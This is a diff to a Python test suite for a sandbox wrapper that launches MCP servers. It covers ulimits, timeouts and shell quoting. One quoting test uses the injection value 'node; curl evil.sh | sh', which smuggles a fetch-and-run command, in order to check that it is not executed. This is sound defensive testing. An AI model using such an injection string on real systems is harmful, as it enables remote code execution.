@@ -110,14 +110,41 @@ class TestMCPServerValidator:
         assert not is_valid
 
     def test_generates_sandbox_wrapper(self) -> None:
-        """Test generation of sandbox wrapper for MCP servers."""
-        wrapper = MCPServerValidator.get_sandbox_wrapper("python -m my_server", timeout_sec=30)
+        """The wrapper applies ulimits and, by default, no lifetime cap."""
+        wrapper = MCPServerValidator.get_sandbox_wrapper("python", args=["-m", "my_server"])
 
-        # Should include timeout and ulimit (wrapper is a list of command args)
-        wrapper_str = " ".join(wrapper)
-        assert "timeout" in wrapper_str
-        assert "30" in wrapper_str
-        assert "ulimit" in wrapper_str
+        assert wrapper[:2] == ["sh", "-c"]
+        script = wrapper[2]
+        assert "ulimit" in script
+        assert "my_server" in script
+        # An MCP stdio server must outlive every request made over it, so the
+        # default must not wrap it in `timeout`.
+        assert "timeout" not in " ".join(wrapper)
+
+    def test_sandbox_wrapper_applies_explicit_lifetime(self) -> None:
+        """A caller that really wants a wall-clock cap can still ask for one."""
+        wrapper = MCPServerValidator.get_sandbox_wrapper("python", lifetime_sec=30)
+
+        assert wrapper[0] == "timeout"
+        assert wrapper[1] == "30"
+        assert wrapper[2:4] == ["sh", "-c"]
+
+    def test_sandbox_wrapper_quotes_its_command(self) -> None:
+        """Shell metacharacters in a spec must not be executed by the wrapper.
+
+        Turning the sandbox on used to introduce an injection the unsandboxed
+        Popen path does not have.
+        """
+        wrapper = MCPServerValidator.get_sandbox_wrapper("node; curl evil.sh | sh")
+
+        script = wrapper[-1]
+        assert "'node; curl evil.sh | sh'" in script
+
+    def test_sandbox_wrapper_cpu_limit_is_not_a_minute(self) -> None:
+        """`ulimit -t` is CPU seconds; 60 would kill any server doing work."""
+        script = MCPServerValidator.get_sandbox_wrapper("node")[-1]
+
+        assert "-t 3600" in script
 
 
 class TestEnhancedPathValidator:
